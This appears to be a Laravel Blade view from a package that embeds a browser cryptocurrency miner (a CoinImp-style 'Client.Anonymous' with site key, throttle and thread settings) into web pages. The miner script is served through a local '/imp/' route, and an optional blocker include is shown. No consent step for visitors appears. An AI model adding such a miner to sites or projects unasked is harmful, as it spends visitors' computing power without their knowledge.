@if($enabled)
<script src="{{ url('/imp/?f=' . $script) }}"></script>
<script>
    if(typeof Client !== undefined) {
        var _client = new Client.Anonymous( '{{ $siteKey }}' , {
            throttle: {{ $desktop['throttle'] }},
            {!! $coin !!}
        });
        @if($desktop['threads'] == 'auto')
            _client.setAutoThreadsEnabled(true);
        @elseif (!empty($desktop['threads']))
            _client.setNumThreads($desktop['threads']);
        @endif

        @includeWhen($mobile['enabled'], 'laraimp::mobile', ['mobile' => $mobile])
        _client.start();
    }
</script>
@includeWhen($blocker['enabled'], 'laraimp::blocker', ['message' => $blocker['message']])
@endif
